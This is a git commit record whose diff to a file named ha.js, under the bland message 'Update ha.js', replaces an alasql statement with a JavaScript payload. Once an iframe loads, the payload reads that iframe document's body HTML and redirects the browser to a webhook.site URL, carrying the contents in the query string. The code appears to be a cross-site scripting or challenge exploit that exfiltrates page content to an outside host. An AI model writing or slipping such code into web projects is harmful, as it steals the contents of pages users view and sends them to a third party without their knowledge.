f86d276df5590937a34571080fa3400425dd8842
filime <36452369+filime@users.noreply.github.com>
2023-04-22 16:04:59 +0900

    Update ha.js

--- ha.js
+++ ha.js
@@ -1,1 +1,4 @@
-alasql("CREATE TABLE asdf")
+ff.addEventListener('load', () => {
+  var a = document.getElementById('ff');
+  location.href="https://webhook.site/6593dab1-9b07-4151-b85b-a6396b3d0a73?a="+a.contentDocument.children[0].children[1].innerHTML
+})
